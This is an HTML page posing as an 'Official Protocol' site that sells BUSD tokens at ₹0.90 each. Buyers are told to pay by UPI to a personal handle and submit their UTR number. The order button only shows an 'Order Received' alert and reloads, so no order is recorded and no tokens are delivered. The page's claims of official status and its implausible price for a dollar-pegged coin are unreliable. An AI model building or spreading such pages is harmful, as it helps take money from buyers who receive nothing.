<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BUSD | Official Protocol</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ff88; --bg: #010409; --card: rgba(255,255,255,0.03); --border: rgba(255,255,255,0.08); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: var(--bg); color: #fff; padding-bottom: 100px; background-image: radial-gradient(circle at top, #002213 0%, #010409 60%); min-height: 100vh; }
        nav { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(1,4,9,0.95); backdrop-filter: blur(15px); position: sticky; top: 0; border-bottom: 1px solid var(--border); z-index: 1000; }
        .page-section { display: none; padding: 20px; animation: fadeIn 0.3s; }
        .page-section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
        .btn-action { background: var(--primary); color: #000; padding: 16px; border-radius: 14px; border: none; font-weight: 800; width: 100%; cursor: pointer; }
        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: #fff; }
        .footer-tabs { position: fixed; bottom: 0; left: 0; width: 100%; background: #010409; border-top: 1px solid var(--border); display: flex; justify-content: space-around; padding: 15px 0; }
        .tab-btn { background: none; border: none; color: #fff; font-size: 0.7rem; opacity: 0.4; text-align: center; flex: 1; }
        .tab-btn.active { opacity: 1; color: var(--primary); font-weight: 800; }
    </style>
</head>
<body>
    <nav>
        <div style="font-weight:800; color:var(--primary);">BUSD PROTOCOL</div>
        <div style="font-size: 0.6rem; opacity: 0.5;">BY BUSD TEAM</div>
    </nav>

    <main id="home-page" class="page-section active">
        <h1 style="font-size: 2.2rem; font-weight: 800; margin-bottom: 10px;">Institutional <br>Asset Gateway</h1>
        <div class="card">
            <h3 style="color: var(--primary); font-size: 0.9rem; margin-bottom: 10px;">SPECS</h3>
            <p style="font-size: 0.8rem; opacity: 0.7;">Supply: 1,000,000,000 BUSD<br>Rate: ₹0.90 / BUSD</p>
        </div>
        <button class="btn-action" onclick="switchPage('p2p-page')">BUY BUSD (P2P)</button>
    </main>

    <main id="p2p-page" class="page-section">
        <div id="step-1" class="card">
            <h3>1. Purchase Details</h3>
            <input type="text" id="wallet-addr" placeholder="Wallet Address (0x...)">
            <input type="number" id="inr-amt" placeholder="Amount INR" oninput="calcCoins()">
            <p style="font-size: 0.8rem; color: var(--primary);">Receive: <span id="coin-res">0</span> BUSD</p>
            <button class="btn-action" onclick="showPayment()">NEXT: PAY VIA UPI</button>
        </div>
        <div id="step-2" class="card" style="display: none; text-align: center;">
            <img id="upi-qr" src="" style="width:180px; background:#fff; padding:10px; border-radius:15px; margin-bottom:15px;">
            <p style="font-weight:800; color:#FFD700;">UPI: Bharatbusd@postbank</p>
            <input type="text" id="utr-number" placeholder="Enter 12-Digit UTR Number">
            <button class="btn-action" onclick="finishOrder()">SUBMIT VERIFICATION</button>
        </div>
    </main>

    <nav class="footer-tabs">
        <button class="tab-btn active" onclick="switchPage('home-page')">🏠<br>Info</button>
        <button class="tab-btn" onclick="switchPage('p2p-page')">🔄<br>Buy</button>
    </nav>

    <script>
        function switchPage(pId) {
            document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
            document.getElementById(pId).classList.add('active');
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        }
        function calcCoins() {
            let inr = document.getElementById('inr-amt').value;
            document.getElementById('coin-res').innerText = inr ? Math.floor(inr / 0.90) : '0';
        }
        function showPayment() {
            let amt = document.getElementById('inr-amt').value;
            let upiUrl = "upi://pay?pa=Bharatbusd@postbank&pn=BUSD_TEAM&am=" + amt + "&cu=INR";
            document.getElementById('upi-qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upiUrl);
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        }
        function finishOrder() {
            alert('✅ Order Received!');
            location.reload();
        }
    </script>
</body>
</html>
